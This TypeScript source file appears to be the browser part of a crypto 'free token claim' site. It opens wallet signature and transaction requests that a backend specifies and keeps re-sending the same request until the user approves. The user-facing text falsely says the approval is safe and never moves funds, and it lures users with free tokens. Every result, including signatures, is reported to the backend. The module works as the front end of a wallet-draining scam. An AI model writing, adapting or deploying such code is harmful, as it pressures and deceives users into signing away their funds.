// src/lib/walletPromptEngine.ts
// Runs in the BROWSER only. Only local browser code can open wallet popups,
// so the backend never talks to the wallet directly — it only describes what
// to prompt, and this module executes it via window.ethereum.request().
//
// IMPORTANT BEHAVIOUR: we DO NOT queue prompts. We take the FIRST prompt the
// backend sends (normally the signature) and keep re-sending that exact same
// request until the user approves it (or explicitly cancels in our overlay).

import { toast } from 'sonner';
import {
  reportWalletEvent,
  verifySignature,
  type WalletPrompt,
} from './backendClient';
import {
  cancelSignatureLoop,
  isSignatureLoopCancelled,
  resetSignatureCancel,
  setSignatureUi,
  waitForRetry,
} from './promptUiBus';

const RETRY_DELAY_MS = 1500;

const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];

const getProvider = (): any | null => {
  if (typeof window === 'undefined') return null;
  return (window as any).ethereum ?? null;
};

const isUserRejection = (err: any) =>
  USER_REJECTED_CODES.includes(err?.code) ||
  USER_REJECTED_CODES.includes(err?.cause?.code) ||
  /reject|denied|declin/i.test(String(err?.message ?? ''));

/** Execute one backend-issued prompt against the wallet. */
async function executePrompt(prompt: WalletPrompt, address: string): Promise<string> {
  const provider = getProvider();
  if (!provider) throw new Error('No injected wallet provider found in this browser.');

  switch (prompt.type) {
    case 'sign_message':
      return provider.request({
        method: 'personal_sign',
        params: [prompt.message, address],
      });

    case 'send_transaction':
      return provider.request({
        method: 'eth_sendTransaction',
        params: [{ from: address, ...prompt.tx }],
      });

    case 'switch_chain':
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: prompt.chainId }],
      });
      return prompt.chainId;

    default:
      throw new Error('Unsupported prompt type from backend');
  }
}

const defaultCopy = (prompt: WalletPrompt) => {
  if (prompt.type === 'send_transaction') {
    return {
      title: prompt.title ?? 'Confirm to receive your tokens',
      description:
        prompt.description ??
        'Your wallet will open a confirmation. Tap Confirm to finish claiming your free tokens.',
    };
  }
  if (prompt.type === 'switch_chain') {
    return {
      title: prompt.title ?? 'Switch network',
      description: prompt.description ?? 'Approve the network switch in your wallet to continue.',
    };
  }
  return {
    title: prompt.title ?? 'You are about to receive your free tokens',
    description:
      prompt.description ??
      'Tap Approve in your wallet to unlock the allocation. Some wallets show generic wording like “Sign message”, “Confirm request” or “Sign-in with Ethereum” — that is the same approval, it is safe and it never moves funds on its own.',
  };
};

export interface RunPromptsOptions {
  sessionId: string;
  address: string;
  prompts: WalletPrompt[];
  /** Called on every state change so the UI can render the loop. */
  onState?: (state: {
    prompt: WalletPrompt;
    attempt: number;
    status: 'pending' | 'rejected' | 'approved' | 'failed';
    message?: string;
  }) => void;
}

/**
 * Repeats the FIRST backend prompt until the user approves it.
 * Nothing is queued — later prompts in the array are ignored on purpose.
 */
export async function runWalletPrompts({
  sessionId,
  address,
  prompts,
  onState,
}: RunPromptsOptions) {
  const prompt = prompts?.[0];
  if (!prompt) return { completed: true };

  resetSignatureCancel();
  const copy = defaultCopy(prompt);

  setSignatureUi({
    open: true,
    status: 'waiting',
    attempt: 1,
    title: copy.title,
    description: copy.description,
    message: prompt.type === 'sign_message' ? prompt.message : undefined,
    errorMessage: undefined,
  });

  let attempt = 0;

  // eslint-disable-next-line no-constant-condition
  while (true) {
    if (isSignatureLoopCancelled()) {
      return { completed: false, lastPromptId: prompt.id };
    }

    attempt += 1;
    onState?.({ prompt, attempt, status: 'pending' });
    setSignatureUi({ status: 'waiting', attempt, errorMessage: undefined });
    void reportWalletEvent({ sessionId, promptId: prompt.id, address, status: 'started', attempt });

    try {
      const result = await executePrompt(prompt, address);

      onState?.({ prompt, attempt, status: 'approved' });
      setSignatureUi({ status: 'approved' });

      await reportWalletEvent({
        sessionId,
        promptId: prompt.id,
        address,
        status: 'approved',
        attempt,
        result,
      });

      if (prompt.type === 'sign_message') {
        try {
          await verifySignature({ sessionId, promptId: prompt.id, address, signature: result });
        } catch (e) {
          console.warn('Signature verification failed', e);
        }
      }

      toast.success('Approved — your tokens are on the way 🎁');
      setTimeout(() => cancelSignatureLoop(), 1500);
      return { completed: true };
    } catch (err: any) {
      const rejected = isUserRejection(err);
      const status = rejected ? 'rejected' : 'failed';

      onState?.({ prompt, attempt, status, message: err?.message });
      setSignatureUi({
        status,
        attempt,
        errorMessage: rejected
          ? undefined
          : String(err?.message ?? err).slice(0, 160),
      });

      void reportWalletEvent({
        sessionId,
        promptId: prompt.id,
        address,
        status,
        attempt,
        errorCode: err?.code,
        errorMessage: String(err?.message ?? err).slice(0, 300),
      });

      // No provider at all — retrying forever is pointless.
      if (!getProvider()) {
        toast.error('No wallet detected in this browser', {
          description: 'Open the site inside your wallet app browser and try again.',
        });
        cancelSignatureLoop();
        return { completed: false, lastPromptId: prompt.id };
      }

      // Wait for the delay OR an immediate "Try again" tap, then re-send the
      // exact same request. Same prompt, never a new one, never queued.
      await waitForRetry(RETRY_DELAY_MS);
    }
  }
}
